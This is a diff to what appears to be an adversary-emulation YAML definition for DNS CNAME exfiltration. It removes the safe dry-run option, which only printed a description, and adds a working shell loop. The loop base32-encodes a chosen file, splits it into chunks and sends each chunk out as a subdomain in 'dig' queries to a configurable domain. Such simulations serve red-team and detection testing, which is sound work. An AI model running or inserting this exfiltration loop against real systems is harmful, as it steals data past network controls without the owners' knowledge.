@@ -31,10 +31,6 @@ args:
   description: Size of data chunks
   type: string
   default: '32'
-- name: dry_run
-  description: Enable dry-run mode
-  type: string
-  default: 'true'
 steps:
 - name: Verify file exists
   inline: test -f '{{ .Args.data_file }}' || (echo "File not found"; exit 1)
@@ -56,23 +52,20 @@ steps:
     \ }}\"\n  echo \"  {{ .Args.subdomain_prefix }}-00003.{{ .Args.dns_domain }}\"\n  echo \"  ...\"\nfi\n"
 - name: Execute DNS exfiltration
   inline: |
-    if [ '{{ .Args.dry_run }}' = 'true' ]; then
-      echo "DRY RUN: DNS CNAME Exfiltration"
-      echo "Process:"
-      echo "  1. Encode file in base32"
-      echo "  2. Split into {{ .Args.chunk_size }}-byte chunks"
-      echo "  3. Create subdomains: chunk.{{ .Args.dns_domain }}"
-      echo "  4. Issue DNS queries for CNAME resolution"
-      echo ""
-      echo "Example command:"
-      echo "  nslookup {{ .Args.subdomain_prefix }}-00001.{{ .Args.dns_domain }}"
-      echo ""
-      echo "Attacker analyzes DNS logs to extract data"
-    else
-      echo "Initiating DNS exfiltration..."
-      # This would implement actual DNS tunneling
-      echo "NOTE: Requires attacker-controlled DNS server"
-    fi
+    echo "Initiating DNS CNAME exfiltration..."
+    encoded=$(base32 < '{{ .Args.data_file }}' | tr -d '=\n' | tr '[:upper:]' '[:lower:]')
+    total=${#encoded}
+    offset=0
+    seq_num=0
+    chunk_size={{ .Args.chunk_size }}
+    while [ $offset -lt $total ]; do
+      chunk=$(echo "$encoded" | cut -c$((offset+1))-$((offset+chunk_size)))
+      subdomain="{{ .Args.subdomain_prefix }}-$(printf '%05d' $seq_num)-${chunk}.{{ .Args.dns_domain }}"
+      dig +short CNAME "$subdomain" 2>/dev/null || true
+      seq_num=$((seq_num + 1))
+      offset=$((offset + chunk_size))
+    done
+    echo "DNS CNAME exfiltration complete: sent $seq_num queries"
   cleanup:
     inline: rm -f /tmp/test_dns_cname.dat
 tests:
